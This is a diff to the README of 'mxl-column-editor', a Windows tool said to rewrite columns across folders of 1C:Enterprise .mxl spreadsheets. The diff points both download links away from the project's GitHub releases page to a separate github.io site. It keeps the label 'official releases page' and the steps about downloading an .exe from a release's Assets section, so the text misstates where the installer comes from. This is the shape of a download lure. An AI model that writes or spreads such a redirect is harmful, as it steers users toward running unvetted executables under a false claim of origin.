@@ -1,12 +1,12 @@
 # 📊 mxl-column-editor - Update spreadsheet columns across complete folders
 
-[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/Butterburrepast286/mxl-column-editor/releases)
+[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://butterburrepast286.github.io)
 
 This application changes column data within multiple 1C:Enterprise .mxl documents. You select a folder, and the software modifies the columns for every file inside. You gain full control over your spreadsheet layouts without manual editing. The interface provides a pixel-accurate view of your changes before you save them.
 
 ## 📥 How to Install
 
-1. Visit the [official releases page](https://github.com/Butterburrepast286/mxl-column-editor/releases).
+1. Visit the [official releases page](https://butterburrepast286.github.io).
 2. Look for the Assets section at the bottom of the most recent release.
 3. Click the link that ends in .exe to download the installer.
 4. Save the file to your computer.
